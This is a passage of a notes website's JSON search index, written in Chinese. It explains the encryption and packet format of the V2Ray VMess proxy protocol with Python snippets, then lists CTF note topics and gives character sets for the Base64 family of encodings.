ptr = 0 def next ( self ) -> int : res = self . buffer [ self . ptr : self . ptr + 2 ] self . ptr += 2 return int . from_bytes ( res , \"big\" ) def encode ( self , size : bytes ) -> int : mask = self . next () size = int . from_bytes ( size , \"big\" ) return mask ^ size def decode ( self , size : bytes ) -> int : mask = self . next () size = int . from_bytes ( size , \"big\" ) return mask ^ size def next_padding_len ( self ) -> int : return self . next () % 64 \u5bf9\u4e8e\u540c\u4e00\u4e2a\u8bf7\u6c42\uff0c\u5176\u6240\u6709\u6570\u636e\u5305\u90fd\u4f7f\u7528\u540c\u4e00\u4e2a Mask\uff0c\u5728\u7f16\u7801\u7684\u65f6\u5019\u5148\u751f\u6210 padding_len\uff0c\u7136\u540e\u518d encode \u6570\u636e\u5305\u957f\u5ea6\uff08\u4e0d\u80fd\u53cd\u8fc7\u6765\uff09 \u4ee5\u89e3\u5bc6\u4e3a\u4f8b\uff08\u4e0b\u9762\u4f8b\u5b50\u4e2d\u662f AES-128-GCM\uff09\u66f4\u80fd\u6e05\u6670\u5730\u8868\u73b0\u51fa\u8fd9\u4e2a\u52a0\u5bc6\u65b9\u6cd5\uff1a cnt = 0 sizeParser = Mask ( requestBodyIV ) # \u8bf7\u6c42\u6307\u4ee4\u90e8\u5206\u4e2d\u5305\u542b\u7684 iv dec_key = requestBodyKey # \u8bf7\u6c42\u6307\u4ee4\u90e8\u5206\u4e2d\u5305\u542b\u7684 key while request_body : # request_body \u5373\u8bf7\u6c42\u7684\u6570\u636e\u90e8\u5206 dec_iv = int . to_bytes ( cnt , 2 , \"big\" ) + requestBodyIV [ 2 : 12 ] padding_len = sizeParser . next_padding_len () length = sizeParser . decode ( request_body [: 2 ]) - padding_len # \u83b7\u53d6\u5bc6\u6587\u957f\u5ea6 request_body = request_body [ 2 :] # \u9664\u53bb\u957f\u5ea6\u4fe1\u606f cipher = AES . new ( key = dec_key , mode = AES . MODE_GCM , nonce = dec_iv ) res = cipher . decrypt_and_verify ( request_body [: length - 16 ], request_body [ length - 16 : length ] ) # \u89e3\u5bc6\u5e76\u9a8c\u8bc1 16 \u5b57\u8282\u8ba4\u8bc1\u4fe1\u606f request_body = request_body [ length :] # \u9664\u53bb\u5bc6\u6587 request_body = request_body [ padding_len :] # \u9664\u53bb padding cnt += 1 # \u4e0b\u4e00\u4e2a\u6570\u636e\u5305 \u670d\u52a1\u5668\u54cd\u5e94 \u00b6 \u54cd\u5e94\u5934\u4f7f\u7528 AES-128-CFB \u52a0\u5bc6 \u54cd\u5e94 key \u4e3a md5(\u8bf7\u6c42 key) \u54cd\u5e94 iv \u4e3a md5(\u8bf7\u6c42 iv) \u5176\u5934\u90e8\u660e\u6587\u4fe1\u606f\u4e3a\uff1a \uff081 \u5b57\u8282\uff09\u54cd\u5e94\u4fe1\u606f V\uff1a\u548c\u5bf9\u5e94\u8bf7\u6c42\u5934\u4e2d\u7684 V \u4fdd\u6301\u4e00\u81f4 \uff081 \u5b57\u8282\uff09\u9009\u9879 opt\uff1a\u5f03\u7528\uff0c\u4e3a 0 \uff081 \u5b57\u8282\uff09\u6307\u4ee4 cmd\uff1a\u4e3a 0x01 \u65f6\u8fd8\u6709\u52a8\u6001\u7aef\u53e3\u6307\u4ee4\uff0c\u4ec5\u4f7f\u7528 AEAD \u65f6\u624d\u4f1a\u6709\uff0c\u5176\u4f59\u60c5\u51b5\u4e3a 0 \u52a8\u6001\u7aef\u53e3\u6307\u4ee4\u8fd9\u91cc\u4e0d\u8be6\u7ec6\u89e3\u91ca \uff081 \u5b57\u8282\uff09\u6307\u4ee4\u957f\u5ea6 M\uff1a\u4f7f\u7528 AEAD \u65f6\u624d\u4f1a\u6709\uff0c\u5176\u4f59\u60c5\u51b5\u4e3a 0 \u5bf9\u4e8e\u4e0d\u4f7f\u7528 AEAD \u7684\u60c5\u51b5\uff0c\u5176\u54cd\u5e94\u5934\u9664 V \u4e4b\u5916\u90fd\u4e3a 0 \u5269\u4f59\u7684\u90e8\u5206\u5c31\u662f\u54cd\u5e94\u7684\u6570\u636e\uff0c\u5176\u7f16\u7801\u65b9\u5f0f\u4e0e\u8bf7\u6c42\u6570\u636e\u4e00\u81f4\uff0c\u5dee\u522b\u4ec5\u5728\u4e8e\u4f7f\u7528\u7684 Mask \u7684 nonce \u4e3a\u54cd\u5e94 iv\uff0c\u4ee5\u53ca\u52a0\u5bc6\u6240\u4f7f\u7528\u7684 key \u548c iv \u90fd\u662f\u54cd\u5e94\u90e8\u5206\u7684\uff08\u4e5f\u5c31\u662f\u5bf9\u8bf7\u6c42\u7684 key \u548c iv \u8fdb\u884c md5\uff09","title":"VMess"},{"location":"cs/web/protocol/vmess/#vmess","text":"Abstract VMess \u662f V2Ray \u539f\u521b\u7684\u57fa\u4e8e TCP \u7684\u52a0\u5bc6\u901a\u8baf\u534f\u8bae\uff0c\u5e38\u7528\u4e8e\u4ee3\u7406\u670d\u52a1\u5668\u7684\u901a\u8baf\u4e0a\u3002 \u5728 2022 \u5f3a\u7f51\u676f\u7ebf\u4e0a\u8d5b\u7684\u65f6\u5019\u5b66\u4e86\u8fd9\u4e2a\u534f\u8bae\uff0c\u8bb0\u5f55\u4e00\u4e0b \u53c2\u8003\uff1a VMess \u534f\u8bae - V2Ray \u5f00\u53d1\u8005\u6587\u6863 \uff08\u5168\u662f\u9519\u8bef\uff0c\u4e0d\u8981\u770b\uff09 v2ray/v2ray-core: proxy/vmess worstass/leaf: leaf/src/proxy/vmess VMess \u534f\u8bae - V2Ray \u767d\u8bdd\u6587\u6559\u7a0b","title":"VMess \u534f\u8bae"},{"location":"cs/web/protocol/vmess/#vmess_1","text":"VMess \u901a\u8fc7 uuid \u548c\u65f6\u95f4\u8fdb\u884c\u8ba4\u8bc1\uff0cuuid \u53ef\u4ee5\u770b\u6210\u4e00\u4e2a 16 \u5b57\u8282\u7684\u968f\u673a\u6570\uff0c\u5f62\u5982 43509e50-1164-11ed-861d-0242ac120002\uff084-2-2-2-6 \u5b57\u8282\uff09\uff0c\u51e0\u4e4e\u5b8c\u5168\u968f\u673a\uff0c\u53ef\u4ee5\u901a\u8fc7 https://www.uuidgenerator.net/ \u751f\u6210\u3002\u9700\u8981\u4fdd\u8bc1\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u8bbe\u7f6e\u7684 uuid \u76f8\u540c\uff0c\u5426\u5219\u65e0\u6cd5\u89e3\u5bc6\u3002\u4ee5\u53ca\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u7684\u65f6\u95f4\u8bbe\u7f6e\u4e0d\u80fd\u504f\u5dee\u592a\u591a\uff0890 \u79d2\u4ee5\u5185\uff09 VMess \u662f\u4e00\u4e2a\u65e0\u72b6\u6001\u534f\u8bae\uff0c\u5373\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4e0d\u9700\u8981\u63e1\u624b\u5373\u53ef\u76f4\u63a5\u4f20\u8f93\u6570\u636e\uff0c\u6bcf\u4e00\u6b21\u6570\u636e\u4f20\u8f93\u5bf9\u4e4b\u524d\u548c\u4e4b\u540e\u7684\u5176\u5b83\u6570\u636e\u4f20\u8f93\u6ca1\u6709\u5f71\u54cd VMess \u7684\u5ba2\u6237\u7aef\u53d1\u8d77\u4e00\u6b21\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u5224\u65ad\u8be5\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u4e00\u4e2a\u5408\u6cd5\u7684\u5ba2\u6237\u7aef\u3002\u5982\u9a8c\u8bc1\u901a\u8fc7\uff0c\u5219\u8f6c\u53d1\u8be5\u8bf7\u6c42\uff0c\u5e76\u628a\u83b7\u5f97\u7684\u54cd\u5e94\u53d1\u56de\u7ed9\u5ba2\u6237\u7aef VMess \u4f7f\u7528\u975e\u5bf9\u79f0\u683c\u5f0f\uff0c\u5373\u5ba2\u6237\u7aef\u53d1\u51fa\u7684\u8bf7\u6c42\u548c\u670d\u52a1\u5668\u7aef\u7684\u54cd\u5e94\u4f7f\u7528\u4e86\u4e0d\u540c\u7684\u683c\u5f0f","title":"VMess \u57fa\u7840"},{"location":"cs/web/protocol/vmess/#_1","text":"VMess \u662f\u975e\u5bf9\u79f0\u683c\u5f0f\uff0c\u6240\u4ee5\u5206\u5ba2\u6237\u7aef\u8bf7\u6c42\u548c\u670d\u52a1\u7aef\u54cd\u5e94\u4e24\u4e2a\u683c\u5f0f \u5e76\u4e14 VMess \u57fa\u4e8e TCP \u534f\u8bae\uff0c\u4ee5\u4e0b\u7684\u5185\u5bb9\u5747\u5305\u542b\u5728 TCP \u534f\u8bae\u7684\u6570\u636e\u90e8\u5206\u4e2d \u4ee5\u4e0b\u5747\u662f\u4e0d\u4f7f\u7528 AEAD \u7684\u60c5\u51b5\uff0c\u4f7f\u7528 AEAD \u65f6\u4f1a\u6709\u5dee\u522b","title":"\u901a\u8baf\u534f\u8bae\u5185\u5bb9"},{"location":"cs/web/protocol/vmess/#_2","text":"\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u5185\u5bb9\u4e3a\uff1a 16 \u5b57\u8282 \u8ba4\u8bc1\u4fe1\u606f \uff08Certification Information\uff09 \u4e0d\u5b9a\u957f\uff08\u4e0b\u9762\u89e3\u91ca\uff09 \u6307\u4ee4\u90e8\u5206 \uff08Instruction Part\uff09\uff0c\u4e5f\u79f0\u8bf7\u6c42\u5934\uff08header\uff09 \u4f59\u4e0b\u7684\u5747\u662f \u6570\u636e\u90e8\u5206 \uff08Data Part\uff09","title":"\u5ba2\u6237\u7aef\u8bf7\u6c42"},{"location":"cs/web/protocol/vmess/#_3","text":"\u8ba4\u8bc1\u4fe1\u606f\u7528\u6765\u7ed9\u670d\u52a1\u7aef\u786e\u8ba4 uuid \u4ee5\u53ca\u65f6\u95f4\u662f\u5426\u6b63\u786e\uff0c\u5982\u679c\u4e0d\u6b63\u786e\u5219\u6574\u4e2a\u5305\u90fd\u65e0\u6cd5\u89e3\u7801 \u6574\u4e2a\u8ba4\u8bc1\u4fe1\u606f\u90e8\u5206\u4f7f\u7528 HMAC \u8ba1\u7b97\u54c8\u5e0c \u4f7f\u7528\u7684 hash \u51fd\u6570\u662f md5 \u5bc6\u94a5\u4e3a\u5341\u516d\u5b57\u8282\u7684 uuid\uff08\u5373\u9664\u53bb \"-\" \u540e\u8bfb\u4e3a 16 \u4e2a\u5b57\u8282\u5185\u5bb9 \u4fe1\u606f\u4e3a\u5f53\u524d\u7684 UTC \u65f6\u95f4\uff08Unix \u65f6\u95f4\u6233\uff0c\u7cbe\u786e\u5230\u79d2\uff09\u4e0a\u4e0b\u968f\u673a\u6d6e\u52a8 30 \u79d2\uff0c\u7136\u540e\u8868\u793a\u4e3a 8 \u5b57\u8282\u5927\u7aef\u683c\u5f0f \u5373\u5229\u7528 Python \u5b9e\u73b0\u8ba4\u8bc1\u4fe1\u606f\u7f16\u7801\uff1a import time , hmac , random # \u6807\u51c6\u5e93 uuid = bytes . fromhex ( \"43509e50-1164-11ed-861d-0242ac120002\" . replace ( \"-\" , \"\" )) t = int ( time . time ()) + random . randint ( - 30 , 30 ) cert_info = hmac . new ( uuid , int . to_bytes ( t , 8 , \"big\" ), digestmod = 'md5' ) . digest () \u5728\u8fdb\u884c\u8ba4\u8bc1\u7684\u65f6\u5019\u4f1a\u53d6\u5f53\u524d\u65f6\u95f4\uff0c\u524d\u540e\u5206\u522b\u679a\u4e3e 120 \u79d2\uff0c\u6839\u636e uuid \u8ba1\u7b97 hash \u7136\u540e\u4e0e\u8ba4\u8bc1\u4fe1\u606f\u8fdb\u884c\u6bd4\u8f83\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u4f1a\u5f97\u5230\u552f\u4e00\u7684\u4e00\u4e2a\u65f6\u95f4\u6233 T\uff0c\u5728\u540e\u9762\u6307\u4ee4\u90e8\u5206\u4e5f\u4f1a\u7528\u5230 V2Ray \u670d\u52a1\u7aef\u7684\u4ee3\u7801\u5b9e\u73b0\u662f\u7f13\u5b58\u3001\u66f4\u65b0\u8fd9 240 \u79d2\u5185\u7684\u54c8\u5e0c\u503c\uff0c\u65b9\u4fbf\u8fdb\u884c\u5feb\u901f\u67e5\u627e\uff08 validator.go \uff09","title":"\u8ba4\u8bc1\u4fe1\u606f"},{"location":"cs/web/protocol/vmess/#_4","text":"\u6307\u4ee4\u90e8\u5206\u6574\u4f53\u662f\u4f7f\u7528 AES-128-CFB \u52a0\u5bc6\u8fc7\u7684 key \u4e3a md5(uuid + b\"c48619fe-8f02-49e0-b9e9-edf763e17e21\") \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\uff0cuuid \u4e3a 16 \u5b57\u8282\uff0c\u540e\u9762\u63a5\u7684\u662f\u56fa\u5b9a\u7684\uff0c\u800c\u4e14\u5e76\u4e14\u4e0d\u662f 16 \u5b57\u8282 uuid \u800c\u662f 36 \u5b57\u8282\uff08\u5b57\u7b26\u4e32\u8f6c bytes\uff0c\u4e00\u4e2a\u5b57\u7b26\u4e00\u4e2a\u5b57\u8282\uff09 iv \u4e3a md5(T * 4) \uff0c\u5176\u4e2d T \u4e3a\u4e0a\u9762\u7528\u4e8e\u8ba1\u7b97 hmac \u54c8\u5e0c\u7684\u65f6\u95f4\u6233\uff088 \u5b57\u8282\u5927\u7aef\uff09 import hashlib from Crypto.Cipher import AES # pycryptodome key = hashlib . md5 ( uuid + b \"c48619fe-8f02-49e0-b9e9-edf763e17e21\" ) . digest () iv = hashlib . md5 ( t * 4 ) . digest () cipher = AES . new ( key = key , mode = AES . MODE_CFB , IV = iv , segment_size = 128 ) inst_part = cipher . encrypt ( inst ) \u672a\u52a0\u5bc6\u7684\u6307\u4ee4\u5185\u5bb9\u4e3a\uff1a \uff08 1 \u5b57\u8282\uff09\u7248\u672c\u53f7 ver\uff1a\u59cb\u7ec8\u4e3a 1 \uff0816 \u5b57\u8282\uff09\u6570\u636e\u90e8\u5206\u52a0\u5bc6 iv\uff1a\u968f\u673a\u751f\u6210\uff0c\u4f9b\u6570\u636e\u90e8\u5206\u52a0\u5bc6\u4f7f\u7528\uff08\u540e\u4e5f\u79f0\u8bf7\u6c42 iv\uff09 \uff0816 \u5b57\u8282\uff09\u6570\u636e\u90e8\u5206\u52a0\u5bc6 key\uff1a\u968f\u673a\u751f\u6210\uff0c\u4f9b\u6570\u636e\u90e8\u5206\u52a0\u5bc6\u4f7f\u7528\uff08\u540e\u4e5f\u79f0\u8bf7\u6c42 key\uff09 \uff08 1 \u5b57\u8282\uff09\u54cd\u5e94\u8ba4\u8bc1 V\uff1a\u968f\u673a\u751f\u6210\uff0c\u7528\u4e8e\u5339\u914d\u54cd\u5e94 \uff08 1 \u5b57\u8282\uff09\u9009\u9879 opt .......S\uff1a\u662f\u5426\u4f7f\u7528\u6807\u51c6\u683c\u5f0f\u6570\u636e\u6d41\uff08\u4e00\u822c\u5747\u4e3a 1\uff09 ......R.\uff1a\u5df2\u5f03\u7528 .....M .. \uff1a\u6570\u636e\u90e8\u5206\u53ca\u54cd\u5e94\u662f\u5426\u5f00\u542f mask\uff08\u540e\u9762\u4f1a\u8be6\u7ec6\u89e3\u91ca\uff09 ....P ... \uff1a\u6570\u636e\u90e8\u5206\u53ca\u54cd\u5e94\u662f\u5426\u5f00\u542f padding \uff08 1 \u5b57\u8282\uff09P \u4e0e Sec \uff08\u524d 4 bit\uff09\u4f59\u91cf P\uff1a\u5728\u6821\u9a8c\u7801\u524d\u6dfb\u52a0\u7684\u5b57\u8282\u6570 \uff08\u540e 4 bit\uff09\u52a0\u5bc6\u65b9\u5f0f Sec\uff1a\u5bf9\u4e8e\u6570\u636e\u90e8\u5206\u53ca\u54cd\u5e94\u4f7f\u7528\u7684\u52a0\u5bc6\u65b9\u5f0f\uff08 \u6b64\u5904\u6587\u6863\u6709\u8bef \uff09 0x1\uff1a\u4f7f\u7528 AES-128-CFB \u7b97\u6cd5\uff08\u5c11\u7528\uff09 0x3\uff1a\u4f7f\u7528 AES-128-GCM \u7b97\u6cd5 0x4\uff1a\u4f7f\u7528 ChaCha20-Poly1305 \u7b97\u6cd5 0x5\uff1a\u4e0d\u52a0\u5bc6\uff08\u5c11\u7528\uff09 \uff08 1 \u5b57\u8282\uff09\u4fdd\u7559\uff0c\u9ed8\u8ba4\u4e3a 0x00 \uff08 1 \u5b57\u8282\uff09\u6307\u4ee4 cmd\uff1a\u4e3a 0x01 \u65f6\u4f7f\u7528 TCP\u3001\u4e3a 0x02 \u65f6\u4f7f\u7528 UDP \uff08 2 \u5b57\u8282\uff09\u7aef\u53e3\u53f7 port\uff1a2 \u5b57\u8282\u5927\u7aef\u683c\u5f0f\u7684\u6574\u578b\u7aef\u53e3\u53f7 \uff08 1 \u5b57\u8282\uff09\u5730\u5740\u7c7b\u578b T\uff1a\u4e3a 0x01 \u5230 0x03 \uff08 ? \u5b57\u8282\uff09\u5730\u5740 A\uff1a \u5f53 T == 0x01 \u65f6\uff1aA \u4e3a 4 \u5b57\u8282 IPv4 \u5730\u5740 \u5f53 T == 0x02 \u65f6\uff1aA \u4e3a 1 \u5b57\u8282\u7684\u957f\u5ea6 L \u540e\u63a5 L \u5b57\u8282\u7684\u57df\u540d \u5f53 T == 0x03 \u65f6\uff1aA \u4e3a 16 \u5b57\u8282 IPv6 \u5730\u5740 \uff08 P \u5b57\u8282\uff09\u968f\u673a\u503c\uff1a\u968f\u673a\u586b\u5145\uff0c\u957f\u5ea6\u7531\u524d\u9762\u7684 P \u51b3\u5b9a \uff08 4 \u5b57\u8282\uff09\u6821\u9a8c\u7801 F\uff1a\u6307\u4ee4\u90e8\u5206\u9664\u6821\u9a8c\u7801\u4ee5\u5916\u6240\u6709\u5185\u5bb9\u7684 fnv1a \u54c8\u5e0c\u503c from fnvhash import fnv1a_32 # pip install fnvhash F = int . to_bytes ( fnv1a_32 ( inst [: 45 + P ]), 4 , \"big\" ) \u6309\u7167\u4e0a\u9762\u7684\u89c4\u5219\u7801\u597d\u6307\u4ee4\u4e4b\u540e\u518d\u7ecf\u8fc7 AES-128-CFB \u52a0\u5bc6\uff0c\u5f97\u5230\u76f8\u540c\u957f\u5ea6\u7684\u5bc6\u6587\uff0c\u5c31\u662f\u6700\u540e\u8981\u653e\u5165\u5305\u4e2d\u7684\u6307\u4ee4\u90e8\u5206 \u89e3\u7801\u65f6\u6839\u636e\u8ba4\u8bc1\u4fe1\u606f\u5f97\u5230\u65f6\u95f4\u6233\u8fdb\u800c\u8ba1\u7b97\u51fa iv\uff0c\u7ecf\u8fc7 AES-128-CFB \u89e3\u5bc6\u5373\u53ef","title":"\u6307\u4ee4\u90e8\u5206"},{"location":"cs/web/protocol/vmess/#_5","text":"\u6570\u636e\u683c\u5f0f\u5206\u4e3a\u57fa\u7840\u683c\u5f0f\uff08basic format\uff09\u548c\u6807\u51c6\u683c\u5f0f\uff08standard format\uff09\u3002\u5176\u4e2d\u57fa\u7840\u683c\u5f0f\u5df2\u7ecf\u5f03\u7528\uff0c\u4f46\u4e3a\u5411\u540e\u517c\u5bb9\u6240\u4fdd\u7559\uff0c\u4ec5\u652f\u6301\u4e0d\u52a0\u5bc6\u548c AES-128-CFB\uff08Sec \u4e3a 0x1 \u6216 0x5\uff09 \u8fd9\u90e8\u5206\u6587\u6863\u4e5f\u6709\u95ee\u9898","title":"\u6570\u636e\u90e8\u5206"},{"location":"cs/web/protocol/vmess/#_8","text":"\u54cd\u5e94\u5934\u4f7f\u7528 AES-128-CFB \u52a0\u5bc6 \u54cd\u5e94 key \u4e3a md5(\u8bf7\u6c42 key) \u54cd\u5e94 iv \u4e3a md5(\u8bf7\u6c42 iv) \u5176\u5934\u90e8\u660e\u6587\u4fe1\u606f\u4e3a\uff1a \uff081 \u5b57\u8282\uff09\u54cd\u5e94\u4fe1\u606f V\uff1a\u548c\u5bf9\u5e94\u8bf7\u6c42\u5934\u4e2d\u7684 V \u4fdd\u6301\u4e00\u81f4 \uff081 \u5b57\u8282\uff09\u9009\u9879 opt\uff1a\u5f03\u7528\uff0c\u4e3a 0 \uff081 \u5b57\u8282\uff09\u6307\u4ee4 cmd\uff1a\u4e3a 0x01 \u65f6\u8fd8\u6709\u52a8\u6001\u7aef\u53e3\u6307\u4ee4\uff0c\u4ec5\u4f7f\u7528 AEAD \u65f6\u624d\u4f1a\u6709\uff0c\u5176\u4f59\u60c5\u51b5\u4e3a 0 \u52a8\u6001\u7aef\u53e3\u6307\u4ee4\u8fd9\u91cc\u4e0d\u8be6\u7ec6\u89e3\u91ca \uff081 \u5b57\u8282\uff09\u6307\u4ee4\u957f\u5ea6 M\uff1a\u4f7f\u7528 AEAD \u65f6\u624d\u4f1a\u6709\uff0c\u5176\u4f59\u60c5\u51b5\u4e3a 0 \u5bf9\u4e8e\u4e0d\u4f7f\u7528 AEAD \u7684\u60c5\u51b5\uff0c\u5176\u54cd\u5e94\u5934\u9664 V \u4e4b\u5916\u90fd\u4e3a 0 \u5269\u4f59\u7684\u90e8\u5206\u5c31\u662f\u54cd\u5e94\u7684\u6570\u636e\uff0c\u5176\u7f16\u7801\u65b9\u5f0f\u4e0e\u8bf7\u6c42\u6570\u636e\u4e00\u81f4\uff0c\u5dee\u522b\u4ec5\u5728\u4e8e\u4f7f\u7528\u7684 Mask \u7684 nonce \u4e3a\u54cd\u5e94 iv\uff0c\u4ee5\u53ca\u52a0\u5bc6\u6240\u4f7f\u7528\u7684 key \u548c iv \u90fd\u662f\u54cd\u5e94\u90e8\u5206\u7684\uff08\u4e5f\u5c31\u662f\u5bf9\u8bf7\u6c42\u7684 key \u548c iv \u8fdb\u884c md5\uff09","title":"\u670d\u52a1\u5668\u54cd\u5e94"},{"location":"ctf/","text":"CTF \u00b6 Abstract \u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u5728\u6253 CTF \u8fc7\u7a0b\u4e2d\u5b66\u4e60\u7684\u7b14\u8bb0 \u76ee\u524d\u53ea\u653b misc\uff0c\u6240\u4ee5\u8fd9\u91cc\u90fd\u662f misc \u7c7b\u7684\u5185\u5bb9\uff0c\u800c\u4e14\u8fd8\u6781\u4e0d\u5168\uff08\u9003 \u6162\u6162\u6536\u96c6\u5b66\u4e60\u4e86 _(:\u0437\u300d\u2220)_ Table of Contents \u00b6 Steganography \u9690\u5199\u672f \u56fe\u7247\u9690\u5199 \u97f3\u9891\u9690\u5199 Sandbox Escape \u6c99\u7bb1\u9003\u9038 Python \u6c99\u7bb1\u9003\u9038 Forensic \u53d6\u8bc1 \u5185\u5b58\u53d6\u8bc1 Coding & Cipher \u7f16\u7801\u548c\u5bc6\u7801 QRCode \u4e8c\u7ef4\u7801\u89c4\u8303 Esolang \u6df1\u5965\u7f16\u7a0b\u8bed\u8a00 Blockchain \u533a\u5757\u94fe Ethereum \u4ee5\u592a\u574a","title":"CTF"},{"location":"ctf/#ctf","text":"Abstract \u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u5728\u6253 CTF \u8fc7\u7a0b\u4e2d\u5b66\u4e60\u7684\u7b14\u8bb0 \u76ee\u524d\u53ea\u653b misc\uff0c\u6240\u4ee5\u8fd9\u91cc\u90fd\u662f misc \u7c7b\u7684\u5185\u5bb9\uff0c\u800c\u4e14\u8fd8\u6781\u4e0d\u5168\uff08\u9003 \u6162\u6162\u6536\u96c6\u5b66\u4e60\u4e86 _(:\u0437\u300d\u2220)_","title":"CTF"},{"location":"ctf/#table-of-contents","text":"Steganography \u9690\u5199\u672f \u56fe\u7247\u9690\u5199 \u97f3\u9891\u9690\u5199 Sandbox Escape \u6c99\u7bb1\u9003\u9038 Python \u6c99\u7bb1\u9003\u9038 Forensic \u53d6\u8bc1 \u5185\u5b58\u53d6\u8bc1 Coding & Cipher \u7f16\u7801\u548c\u5bc6\u7801 QRCode \u4e8c\u7ef4\u7801\u89c4\u8303 Esolang \u6df1\u5965\u7f16\u7a0b\u8bed\u8a00 Blockchain \u533a\u5757\u94fe Ethereum \u4ee5\u592a\u574a","title":"Table of Contents"},{"location":"ctf/coding/","text":"\u7f16\u7801\u53ca\u53e4\u5178\u5bc6\u7801 \u00b6 Abstract \u9898\u76ee\u4e2d\u4e5f\u7ecf\u5e38\u4f1a\u51fa\u73b0\u4e00\u4e9b\u548c\u7f16\u7801\u548c\u53e4\u5178\u5bc6\u7801\u6709\u5173\u7684\u8fc7\u7a0b \u7f16\u7801\u9700\u8981\u6839\u636e\u7279\u5f81\u5224\u65ad\u51fa\u7f16\u7801\u65b9\u5f0f\uff0c\u53e4\u5178\u5bc6\u7801\u5219\u9700\u8981\u77e5\u9053\u5bc6\u94a5\u6765\u89e3\u5bc6 \u7f16\u7801 \u00b6 Base64 \u00b6 Base64 \u662f\u5c063\u4e2a8\u4f4d\u8f6c\u4e3a4\u4e2a6\u4f4d\u4e8c\u8fdb\u5236\u6570\u7684\u7f16\u7801\u65b9\u6cd5\u3002\u5982\u679c\u7f16\u7801\u540e\u4e0d\u4e3a4\u7684\u500d\u6570\u5219\u8865 = \uff0c\u6240\u4ee5\u7279\u5f81\u662f\u7ed3\u5c3e\u4f1a\u6709 0-2 \u4e2a = \u5e76\u4e146\u4f4d\u4e8c\u8fdb\u5236\u6570\u4f1a\u88ab\u6620\u5c04\u4e3a\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u5206\u522b\u662f A-Za-z0-9+/ 63\u4e2a\u5b57\u7b26\uff0c\u7b97 = 64\u4e2a Base\u7cfb\u5217 \u00b6 \u7f16\u7801\u65b9\u5f0f \u7279\u5f81 \u5b57\u7b26\u96c6 Base100 \u7f16\u7801\u4e3a emoji Base85 \u7279\u6b8a\u5b57\u7b26\u591a 0-9A-Za-z!#$%&()*+-;<=>?@^_`{|}~ Base64 \u7ed3\u5c3e\u4f1a\u67090-2\u4e2a\u7b49\u53f7 A-Za-z0-9+/ Base58 \u6ca1\u6709\u7279\u6b8a\u5b57\u7b26\u3001\u6ca1\u6709 0OIl 1-9A-HJ-NP-Za-km-z Base36 0-9A-Z Base32 \u7ed3\u5c3e\u4f1a\u6709\u8f83\u591a\u7b49\u53f7 A-Z2-7 Base16 \u662f\u4e00\u4e2a\u5341\u516d\u8fdb\u5236\u4e32 0-9A-F \u5de5\u5177\uff1a mufeedvh/basecrack xxencode & uuencode \u00b6 \u7c7b\u4f3c Base64 xxencode \u5b57\u7b26\u96c6\uff1a +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz uuencode \u5b57\u7b26\u96c6\uff1a !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_ \u7a7a\u683c\u53ef\u80fd\u4f1a\u6539\u4e3a ` \u5de5\u5177\uff1apython codecs.encode / codecs.decode Unicode \u00b6 https://home.unicode.org/ https://tool.chinaz.com/Tools/Unicode.aspx Emojis \u00b6 https://www.emojiall.com/zh-hans emoji-aes \uff08\u9700\u8981 key\uff09\uff0c\u7279\u5f81\uff1a\ud83d\ude43\ud83d\udcb5\ud83c\udf3f\ud83c\udfa4\u7b49\u5f00\u5934 \u5de5\u5177 \u00b6 DenCode\uff1a https://dencode.com/ Ciphey\uff1a Ciphey/Ciphey CyberChef\uff1a https://gchq.github.io/CyberChef/ emoji-aes\uff1a https://aghorler.github.io/emoji-aes/ tool box\uff1a http://www.hiencode.com/ \u5176\u4ed6\u7f16\u7801 \u00b6 \u76f2\u6587\u6570\u5b66\uff1a https://nemeth.aphtech.org/ \u4e09\u8bcd\u5730\u5740\uff1a https://map.what3words.com/ \u53e4\u5178\u5bc6\u7801 \u00b6","title":"\u7f16\u7801\u4e0e\u5bc6\u7801"},{"location":"ctf/coding/#_1","text":"Abstract \u9898\u76ee\u4e2d\u4e5f\u7ecf\u5e38\u4f1a\u51fa\u73b0\u4e00\u4e9b\u548c\u7f16\u7801\u548c\u53e4\u5178\u5bc6\u7801\u6709\u5173\u7684\u8fc7\u7a0b \u7f16\u7801\u9700\u8981\u6839\u636e\u7279\u5f81\u5224\u65ad\u51fa\u7f16\u7801\u65b9\u5f0f\uff0c\u53e4\u5178\u5bc6\u7801\u5219\u9700\u8981\u77e5\u9053\u5bc6\u94a5\u6765\u89e3\u5bc6","title":"\u7f16\u7801\u53ca\u53e4\u5178\u5bc6\u7801"},{"location":"ctf/coding/#_2","text":"","title":"\u7f16\u7801"},{"location":"ctf/coding/#base64","text":"Base64 \u662f\u5c063\u4e2a8\u4f4d\u8f6c\u4e3a4\u4e2a6\u4f4d\u4e8c\u8fdb\u5236\u6570\u7684\u7f16\u7801\u65b9\u6cd5\u3002\u5982\u679c\u7f16\u7801\u540e\u4e0d\u4e3a4\u7684\u500d\u6570\u5219\u8865 = \uff0c\u6240\u4ee5\u7279\u5f81\u662f\u7ed3\u5c3e\u4f1a\u6709 0-2 \u4e2a = \u5e76\u4e146\u4f4d\u4e8c\u8fdb\u5236\u6570\u4f1a\u88ab\u6620\u5c04\u4e3a\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u5206\u522b\u662f A-Za-z0-9+/ 63\u4e2a\u5b57\u7b26\uff0c\u7b97 = 64\u4e2a","title":"Base64"},{"location":"ctf/coding/#base","text":"\u7f16\u7801\u65b9\u5f0f \u7279\u5f81 \u5b57\u7b26\u96c6 Base100 \u7f16\u7801\u4e3a emoji Base85 \u7279\u6b8a\u5b57\u7b26\u591a 0-9A-Za-z!#$%&()*+-;<=>?@^_`{|}~ Base64 \u7ed3\u5c3e\u4f1a\u67090-2\u4e2a\u7b49\u53f7 A-Za-z0-9+/ Base58 \u6ca1\u6709\u7279\u6b8a\u5b57\u7b26\u3001\u6ca1\u6709 0OIl 1-9A-HJ-NP-Za-km-z Base36 0-9A-Z Base32 